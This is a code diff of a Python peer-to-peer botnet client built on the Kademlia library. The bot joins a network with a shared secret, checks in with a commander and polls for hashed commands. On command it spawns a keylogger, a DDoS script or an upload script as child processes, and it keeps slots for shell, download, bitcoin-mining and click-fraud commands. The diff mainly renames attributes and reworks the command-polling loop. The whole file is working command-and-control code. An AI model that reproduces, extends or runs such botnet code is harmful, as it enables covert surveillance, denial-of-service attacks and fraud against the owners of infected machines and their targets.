@@ -1,9 +1,10 @@
 import logging, sys, pdb
+import pprint as pp
 import asyncio, subprocess, hashlib, socket
 #from asyncio.tasks import ensure_future
 from kademlia.network import Server
 from collections import Counter
-
+#from .globals import SECRET # Trying to import var from global file
 #Network Secret, allows nodes to join same Network
 SECRET="TheSecretKey"
 
@@ -17,7 +18,7 @@ log.addHandler(handler)
 
 
 if len(sys.argv) != 4:
-    print("Usage: python botnet_updated.py <bootstrap ip> <bootstrap port> <bot port>")
+    print("Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>")
     exit(0)
 
 #Helper functions
@@ -38,36 +39,38 @@ def most_common(list):
     data = Counter(list)
     return data.most_common(1)[0][0]
 
-#Botclass that holds network, and bot information
+#Bot class that holds network, and bot information 
 class botnode:
     def __init__(self, ip, port, network_id, cmdhash):
-        self.ip = ip
-        self.port = port
-        self.id = network_id
-        self.cmdcnt = 0
+        self._ip = ip
+        self._port = port
+        self._id = network_id
+        self._cmdcnt = 0
+        #self._cmdque = asyncio.Queue() #TODO use for querying multiple commands at once.
         # this will store all the child processes that are started
-        self.pgroup = []
+        self._pgroup = []
         #This should be populated from a seperate file then encrytped
-        self.cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
+        self._cmdsrun = {'DDOS': False, 'SHELL': False, 'DOWNLOAD': False,
                         'KEYLOG': False, 'UPLOAD': False, 'BITCOIN': False,
-                        'CLICKFRAUD': False, 'HELLO':False}
+                        'CLICKFRAUD': False, 'HELLO': False}
         # This is the hash of this node's bot ID (Will be used when commander looks up machines to send CMDs)
-        self.cmdkey = cmdhash
-
+        self._cmdkey = cmdhash
+    def listVars(self):
+        pp.pprint(vars(self))
 """
-Query Value returned from cmdkey
+Query Value returned from _cmdkey
 If command has not been ran then spawn a child process, and run the command.
 Block the command from being run again.
 Return to wait_cmd() loop and check for new commands
 """
-async def get_cmd(value, server, bot):
+async def get_cmd(value, sever, bot):
     #The bot needs to check the recived command ID (hashed) from the commander, then sets its value to true and performs the works
-    hashcmds = [get_hash(command) for command in bot.cmdsrun.keys()]
-    #print("\nTrying to find {} in {}\n".format(value,hashcmds))
-    """
+    hashcmds = [get_hash(command) for command in bot._cmdsrun.keys()] #Create a list of the hash IDs for commands (ie. SHA1 digest of 'HELLO')
+    #print("\nTrying to find {} in {}\n".format(value,hashcmds)) #Debug print statement
+    """ Ideally the commands should not be stored 
     def run_cmd(cmd):
         decrypt(cmd)
-        if bot.cmdsrun[cmd] is False:
+        if bot._cmdsrun[cmd] is False:
             
             tmp = 'python {} {}'.format(cmd)
     """
@@ -77,26 +80,27 @@ async def get_cmd(value, server, bot):
         cnt = len(args) # parse out the command count
         #cnt=len(args)
         cmd = args[0]
-        print("\nRUNNING CMD: {}\nCMD CNT: {}\nTotal CMDS:{}".format(cmd,cnt,bot.cmdcnt))
+        print("\nRUNNING CMD: {}\nCMD CNT: {}\nTotal CMDS:{}".format(cmd,cnt,bot._cmdcnt))
 
-        #This should automatically populate the commands to check 
-        #for c in hashcmds: 
-        if cmd in hashcmds and cnt > bot.cmdcnt:
-            bot.cmdcnt += 1
+        # This eventually will automatically populate the commands to check 
+        # Checks if the recieved hash from the commander matches one of the valid commands stored in bot. (see self._cmdsrun)
+        # If that has matches, well mark command true to prevent running same command repeatedly. Start a child process, and run the command. 
+        if cmd in hashcmds and cnt > bot._cmdcnt:
+            bot._cmdcnt += 1
             #run_cmd(cmd)
             if cmd == get_hash('KEYLOG'):
-                if bot.cmdsrun['KEYLOG'] is False:
-                    tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
+                if bot._cmdsrun['KEYLOG'] is False:
+                    tmp = 'python keylogger.py {0}'.format(bot._cmdkey)
                     print("Starting keylogger")
                     process = subprocess.Popen(tmp.split(), shell=False)
-                    bot.pgroup.append(process)
-                    bot.cmdsrun['KEYLOG'] = True
+                    bot._pgroup.append(process)
+                    bot._cmdsrun['KEYLOG'] = True
             if cmd == get_hash('DDOS'):
-                if bot.cmdsrun['DDOS'] is False:
+                if bot._cmdsrun['DDOS'] is False:
                     tmp = 'python ddos.py {0}'.format(' '.join(args[1:]))
                     print("Starting DDOS on {0}".format(tmp))
                     process = subprocess.Popen(tmp.split(), shell=False)
-                    bot.cmdsrun['DDOS'] = True
+                    bot._cmdsrun['DDOS'] = True
             if cmd == get_hash('UPLOAD'):
                 tmp = 'python upload.py {0}'.format(' '.join(args[1:]))
                 print("Starting upload on {0}".format(tmp))
@@ -122,30 +126,34 @@ async def get_cmd(value, server, bot):
         print("\nCaught Exception {}".format(e)) #log.error(msg)
         print("We errored out trying to match command {} {}\n".format(type(cmd),cmd)) #log.error()
         pass
-    #pdb.set_trace()
-    #await wait_cmd(server, bot)
-
+    # pdb.set_trace()
+    # After running command set 
+    #await server.set(bot._cmdkey)
+    # await wait_cmd(server, bot)
 
 """
-Query the network for any store requests with the cmdkey of our node
+Query the network for any store requests with the _cmdkey of our node
 While there is no command, wait 5 seconds, then check again
 If command is found, break out, then run get_cmd()
 """
 async def wait_cmd(server, bot):
     print("Checking for command")
     numcalls = 0
-    checkCommands = await server.get(bot.cmdkey)
+    checkCommands = await server.get(bot._cmdkey)
     while checkCommands is None: #and numcalls < 5: #set max calls to 5 for debugging 
         print("\nNO COMMAND FOR ME WAITING")
-        checkCommands = await server.get(bot.cmdkey)
         await asyncio.sleep(5)
+        checkCommands = await server.get(bot._cmdkey)
         numcalls+=1
         #When the command is received get will return True and break out of the loop
-        if checkCommands:
+        if checkCommands or numcalls > 5: #
+            print("Timed out waiting for command") 
             break
-    print("\nFound a command\nNodeID: {}\n".format(checkCommands))
-    await asyncio.sleep(5)
-    await get_cmd(checkCommands,server,bot)
+    if checkCommands is not None: # You need the if statement hear, in the case in which the command times out, the code will not try to execute a non valid command.
+        print("\nFound a command\nCommand Hashed: {}\n".format(checkCommands))
+        await asyncio.sleep(5)
+        await get_cmd(checkCommands,server,bot)
+            
     
 """
 callhome -> Checks to see if a node has already joined the network
@@ -157,16 +165,15 @@ async def callhome(server, bot):
     ##NOTE KEY initialized at start of loop, no need to create here
     # announce to Shepard that we exist, then check for ack
     nodeId = await server.get(NETKEY)
-    if nodeId != str(bot.id) or nodeId is None:
+    if nodeId != str(bot._id) or nodeId is None:
         print("No ack for {}".format(nodeId))
-        await server.set(NETKEY, str(bot.id))
+        await server.set(NETKEY, str(bot._id))
         await asyncio.sleep(5)
         await callhome(server,bot)
     else:    
         print("\nWe have an ack\nNode: {}\nJoined: {}\n"
         .format(nodeId,NETKEY))
-        await wait_cmd(server,bot)
-
+        #await wait_cmd(server,bot)
 
 
 ##TODO:DONE - Confirm if idhash == network key, confirm from debug traces looks like NodeID might be getting set as KEY on network. 
@@ -187,6 +194,7 @@ async def setup(server):
     #print("\nBOT CREATED?: CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
     #pdb.set_trace()
     await callhome(server, bot)
+    return bot
 
 
 ### IF check does nothing server returning NoneType, bc Node has not yet joined network. 
@@ -225,9 +233,15 @@ try:
         run forever = schedule a task to to check if command new command is available      
     """
     # if await bootStrapDone(server):
-    asyncio.ensure_future(setup(server))
+    bot = loop.run_until_complete(setup(server)) #This returns bool, or nonetype
     #fi 
-    #asyncio.ensure_future(wait_cmd())
+    loop_counter=0
+    while asyncio.ensure_future(bootstrapDone(server)): #Returns true if server is bootstrapped, otherwise will continue to try and join SECRET network.
+        loop_counter+=1
+        print("Started a new loop numer:\n{}".format(loop_counter))
+        #bot.listVars()
+        loop.run_until_complete(wait_cmd(server, bot))# loop.call_soon_threadsafe() #If we on the network wait for a command; Tried asyncio.ensure_furture(wait_cmd())
+        asyncio.sleep(1)
     loop.run_forever()
 except KeyboardInterrupt:
     pass
